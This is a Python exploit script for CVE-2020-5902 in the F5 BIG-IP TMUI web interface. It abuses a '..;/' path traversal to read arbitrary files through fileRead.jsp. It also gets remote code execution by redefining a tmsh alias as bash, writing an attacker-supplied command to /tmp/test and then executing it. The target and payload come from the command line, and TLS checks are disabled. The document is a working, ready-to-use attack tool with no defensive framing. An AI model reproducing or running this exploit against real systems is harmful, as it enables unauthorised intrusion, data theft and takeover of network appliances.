#!/usr/bin/env python3

import requests
import sys
import json
requests.packages.urllib3.disable_warnings()

banner= '''
   ______     _______     ____   ___ ____   ___       ____  ___   ___ ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|/ _ \ / _ \___ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \ (_) | | | |__) |
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \__, | |_| / __/ 
  \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/  /_/ \___/_____|

By: AJ
'''

def lfi(action):
	r = requests.get(url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={0}'.format(action),verify=False,timeout=30)

	if r.status_code == 200:
		response = r.content.decode('utf-8')
		response = json.loads(response)
		print('\n' + response["output"])
	else:
		print(r)

def rce(action):
	delete_alias_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
	create_alias_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
	write_bash_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content={0}'.format(action)
	exec_bash_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test'

	req1 = requests.get(delete_alias_url, verify=False, timeout=30)
	if req1.status_code == 200:
		print("Successfully deleted alias list=bash")
	else:
		print("Failed alias deletion.")

	req2 = requests.get(create_alias_url, verify=False, timeout=30)
	if req2.status_code == 200:
		print("Successfully created alias list=bash")
	else:
		print("Failed alias creation.")

	req3 = requests.get(write_bash_url, verify=False, timeout=30)
	if req3.status_code == 200:
		print("Success!")
	else:
		print("Failed!")

	req4 = requests.get(exec_bash_url, verify=False, timeout=30)
	if req4.status_code == 200:
		print(req4.text)
		response = req4.content.decode('utf-8')
		response = json.loads(response)
		print('\n' + response["output"])
	else:
		print(req4)

if __name__ == "__main__":
	try:
		print(banner)

		target = sys.argv[1]
		exploit = sys.argv[2]
		action = sys.argv[3]

		print('Targeting https://{0}'.format(target))
		print('Attack Type: {0}'.format(exploit))
		print('Trying to execute/retrieve: {0}'.format(action))

		url = 'https://{0}'.format(target)

		if exploit.lower() == "lfi":
			lfi(action)
		elif exploit.lower() == "rce":
			rce(action)
		else:
			print('Kindly specify exploit type: LFI or RCE.')

	except Exception as e:
		print(e)
		print('usage: CVE-2020-5902.py <TARGET> <EXPLOIT> <ACTION>')

	except KeyboardInterrupt:
		exit('\nCTRL + C detected ... exiting')
